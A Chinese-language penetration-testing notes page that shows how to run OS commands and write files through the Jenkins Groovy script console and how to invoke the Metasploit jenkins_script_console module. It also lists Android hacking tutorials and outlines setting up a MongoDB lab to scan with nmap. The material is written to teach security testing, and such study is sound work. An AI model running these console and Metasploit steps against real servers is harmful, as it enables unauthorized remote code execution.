### Jenkins 初始设置与安全注意事项

#### 日志记录
- **时间**: 2017年3月15日 05:05:18
- **事件**: 成功获取了 `hudson.tools.JDKInstaller` 的更新数据文件，并在27,508毫秒内完成了下载元数据的处理。

#### 密码要求
- **信息**: 需要密码来完成Jenkins的初始设置。
- **详情**:
  - 已创建管理员用户并生成了密码。
  - 使用以下密码进行安装：
    ```
    e019dca34bac4a30beca67b53e821f35
    ```

### 如何利用 Jenkins 服务器

#### 访问和控制
- **访问方式**: 通过脚本控制台可以对Jenkins服务器执行操作。
- **功能说明**:
  - 脚本控制台允许用户输入任意Groovy脚本来进行故障排除或诊断。
  - 推荐使用 `println` 命令输出结果，因为 `System.out` 将输出到服务器的标准输出流中，不易查看。

#### 示例脚本
- **execmd.groovy**:
  - 用于执行操作系统命令。
  - **Windows**:
    ```groovy
    println "cmd.exe /c dir".execute().text
    ```
  - **Linux**:
    ```groovy
    println "uname -a".execute().text
    ```

- **writefile.groovy**:
  - 用于将字符串写入服务器上的文件。
  - 示例:
    ```groovy
    new File("/tmp/test.sh").write("""
    echo "123"
    echo "456"
    """)
    ```

#### 使用 Metasploit 框架
- **模块**: `exploit/multi/http/jenkins_script_console`
- **选项**:
  - **PASSWORD**: 管理员用户的密码（可选）
  - **Proxies**: 代理链（可选）
  - **RHOST**: 目标地址（必填）
  - **RPORT**: 目标端口（默认为8080）
  - **TARGETURI**: Jenkins路径（默认为 `/`）
  - **USERNAME**: 用户名（可选）
  - **VHOST**: HTTP虚拟主机（可选）

- **示例**:
  ```bash
  msf > use exploit/multi/http/jenkins_script_console
  msf exploit(jenkins_script_console) > set RHOST 192.168.1.100
  msf exploit(jenkins_script_console) > set RPORT 8080
  msf exploit(jenkins_script_console) > set TARGETURI /
  msf exploit(jenkins_script_console) > exploit
  ```

### WEB应用程序评估

#### Android Hacking 与 安全
- [利用保护应用程序组件](http://resources.infosecinstitute.com/android-hacking-security-part-1-exploiting-securing-application-components/)
- [内容提供者泄露](http://resources.infosecinstitute.com/android-hacking-security-part-2-content-provider-leakage/)
- [利用广播接收机](http://resources.infosecinstitute.com/android-hacking-security-part-3-exploiting-broadcast-receivers/)
- [利用非预期的数据泄漏端信道数据泄漏](http://resources.infosecinstitute.com/android-hacking-security-part-4-exploiting-unintended-data-leakage-side-channel-data-leakage/)
- [使用jdb调试java应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-5-debugging-java-applications-using-jdb/)
- [利用可调试的android应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/)
- [攻击android的webviews](http://resources.infosecinstitute.com/android-hacking-security-part-7-attacks-android-webviews/)
- [根检测规避](http://resources.infosecinstitute.com/android-hacking-security-part-8-root-detection-evasion/)
- [不安全的本地存储共享偏好](http://resources.infosecinstitute.com/android-hacking-security-part-9-insecure-local-storage-shared-preferences/)
- [不安全的本地存储](http://resources.infosecinstitute.com/android-hacking-security-part-10-insecure-local-storage/)
- [黑盒评估introspy](http://resources.infosecinstitute.com/android-hacking-security-part-11-blackbox-assessments-introspy/)
- [保护共享偏好第三方库](http://resources.infosecinstitute.com/android-hacking-security-part-12-securing-shared-preferences-third-party-libraries/)
- [drozer介绍](http://resources.infosecinstitute.com/android-hacking-security-part-13-introduction-drozer/)
- [检查Android应用程序特定的数据非根设备](http://resources.infosecinstitute.com/android-hacking-security-part-14-examining-android-app-specific-data-non-rooted-devices/)
- [使用备份技术攻击android应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-15-hacking-android-apps-using-backup-techniques/)
- [破解密码学](http://resources.infosecinstitute.com/android-hacking-security-part-16-broken-cryptography/)
- [破解Android应用程序二进制文件](http://resources.infosecinstitute.com/android-hacking-security-part-17-cracking-android-app-binaries/)
- [逆向工程介绍](http://resources.infosecinstitute.com/android-hacking-and-security-part-18-introduction-to-reverse-engineering/)
- [使用nosql数据库不安全的数据存储](http://resources.infosecinstitute.com/android-hacking-and-security-part-19-insecure-data-storage-with-nosql-databases/)
- [使用gdb在android模拟器上调试应用程序](http://resources.infosecinstitute.com/android-hacking-and-security-part-20-debugging-apps-on-android-emulator-using-gdb/)

### 数据库评估

#### MongoDB

##### 1. 介绍和Labs安装
- **MongoDB简介**:
  - 开源、文档导向的数据库管理系统。
  - 特性：基于文档、高性能、高可用性、简单扩展性。

- **安全性**:
  - 应考虑NoSQL数据库的安全性。
  - 生态系统中的每个人都应对安全性负责。
  - 内置安全功能可能因配置错误等原因存在漏洞。

- **Ubuntu中安装MongoDB**:
  - **步骤1**: 导入MongoDB GPG密钥。
    ```bash
    sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10
    ```
  - **步骤2**: 创建list file。
    ```bash
    echo "deb http://repo.mongodb.org/apt/ubuntu precise/mongodb-org/3.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-3.0.list
    ```
  - **步骤3**: 更新列表。
    ```bash
    sudo apt-get update
    ```
  - **步骤4**: 安装特定版本的MongoDB。
    ```bash
    sudo apt-get install -y mongodb-org=3.0.4 mongodb-org-server=3.0.4 mongodb-org-shell=3.0.4 mongodb-org-mongos=3.0.4 mongodb-org-tools=3.0.4
    ```
  - **步骤5**: 配置防止意外升级。
    ```bash
    echo "mongodb-org hold" | sudo dpkg --set-selections
    echo "mongodb-org-server hold" | sudo dpkg --set-selections
    echo "mongodb-org-shell hold" | sudo dpkg --set-selections
    echo "mongodb-org-mongos hold" | sudo dpkg --set-selections
    echo "mongodb-org-tools hold" | sudo dpkg --set-selections
    ```
  - **步骤6**: 启动MongoDB服务。
    ```bash
    sudo service mongod start
    ```
  - **步骤7**: 验证进程是否成功启动。
    ```bash
    tail -20 /var/log/mongodb/mongod.log
    ```
  - **步骤8**: 启动MongoDB以实现渗透测试。
    ```bash
    sudo mongod --httpinterface --rest --smallfiles
    ```

##### 2. 学习Mongo Shell
- **基本术语**:
  - MongoDB 可以有多个数据库。
  - 每个数据库都含有一个或多个集合。
  - 每个集合都含有一个或多个文档。

- **基本命令**:
  - **创建数据库**:
    ```javascript
    use testdb
    ```
  - **检查当前数据库**:
    ```javascript
    db
    ```
  - **列出所有数据库**:
    ```javascript
    show dbs
    ```
  - **插入数据**:
    ```javascript
    db.data.insert({"user":"test1"})
    ```
  - **查询数据**:
    ```javascript
    db.data.find()
    ```
  - **条件查询**:
    ```javascript
    db.data.find({"user":"test1"})
    ```
  - **删除数据**:
    ```javascript
    db.data.remove({"user":"test3"})
    ```
  - **删除集合**:
    ```javascript
    db.data.drop()
    ```
  - **删除数据库**:
    ```javascript
    db.dropDatabase()
    ```

##### 3. Lab实验环境安装
- **搭建步骤**:
  - 在Ubuntu上安装MongoDB和PHP Web应用程序。
  - 插入测试数据到“users”和“products”集合。
  - 安装mongo PHP驱动程序。
  - 安装PHP Web应用程序。

##### 4. 漏洞评估
- **扫描开放端口**:
  - 使用nmap扫描MongoDB默认端口27017。
- **服务枚举**:
  - 使用nmap的“-sV”标志进行服务枚举。
- **扫描HTTP接口**:
  - 检查是否存在未授权访问的HTTP接口。